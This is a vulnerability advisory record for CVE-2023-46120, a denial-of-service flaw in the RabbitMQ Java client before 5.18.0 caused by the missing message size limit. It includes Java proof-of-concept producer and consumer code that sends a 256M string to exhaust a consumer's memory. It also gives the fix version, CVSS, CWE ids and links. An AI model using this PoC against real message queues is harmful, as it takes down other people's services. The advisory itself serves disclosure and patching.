---
identifier: "CVE-2023-46120"
identifiers:
- "CVE-2023-46120"
- "GHSA-mm8h-8587-p46h"
package_slug: "maven/com.rabbitmq/amqp-client"
title: "RabbitMQ Java client's Lack of Message Size Limitation leads to Remote DoS
  Attack"
description: "### Summary\n`maxBodyLebgth` was not used when receiving Message objects.
  Attackers could just send a very large Message causing a memory overflow and triggering
  an OOM Error.\n\n### PoC\n#### RbbitMQ\n* Use RabbitMQ 3.11.16 as MQ and specify
  Message Body size 512M (here it only needs to be larger than the Consumer memory)\n*
  Start RabbitMQ\n#### Producer\n* Build a String of length 256M and send it to Consumer\n```\npackage
  org.springframework.amqp.helloworld; \n\nimport org.springframework.amqp.core.AmqpTemplate;
  \nimport org.springframework.context.ApplicationContext; \nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;
  \n\npublic class Producer {\n public static void main(String[] args) {\n  ApplicationContext
  context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n
  \ AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class); \n  String s
  = \"A\";\n  for(int i=0;i<28;++i){\n   s = s + s;\n   System.out.println(i);\n  }\n
  \ amqpTemplate.convertAndSend(s);\n  System.out.println(\"Send Finish\");\n }\n
  }\n```\n\n#### Consumer\n* First set the heap memory size to 128M\n* Read the message
  sent by the Producer from the MQ and print the length\n```\npackage org.springframework.amqp.helloworld;\n\nimport
  org.springframework.amqp.core.AmqpTemplate;\nimport org.springframework.amqp.core.Message;\nimport
  org.springframework.context.ApplicationContext;\nimport org.springframework.context.annotation.AnnotationConfigApplicationContext;\n\npublic
  class Consumer {\n \n public static void main(String[] args) {\n  ApplicationContext
  context = new AnnotationConfigApplicationContext(HelloWorldConfiguration.class);\n
  \ AmqpTemplate amqpTemplate = context.getBean(AmqpTemplate.class);\n  Object o =
  amqpTemplate.receiveAndConvert();\n  if(o != null){\n   String s = o.toString();\n
  \  System.out.println(\"Received Length : \" + s.length());\n  }else{\n   System.out.println(\"null\");\n
  \ }\n }\n}\n```\n#### Results\n* Run the Producer first, then the Consumer\n* Consumer
  throws OOM Exception\n\n\n### Impact\nUsers of RabbitMQ may suffer from DoS attacks
  from RabbitMQ Java client which will ultimately exhaust the memory of the consumer.\n"
date: "2023-11-01"
pubdate: "2023-10-25"
affected_range: "(,5.18.0)"
fixed_versions:
- "5.18.0"
affected_versions: "All versions before 5.18.0"
not_impacted: "All versions starting from 5.18.0"
solution: "Upgrade to version 5.18.0 or above."
urls:
- "https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h"
- "https://github.com/rabbitmq/rabbitmq-java-client/issues/1062"
- "https://github.com/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8"
- "https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0"
- "https://github.com/advisories/GHSA-mm8h-8587-p46h"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
uuid: "61838f06-abfe-4ff6-8c95-c6d3c09dbcc5"
cwe_ids:
- "CWE-1035"
- "CWE-400"
- "CWE-937"
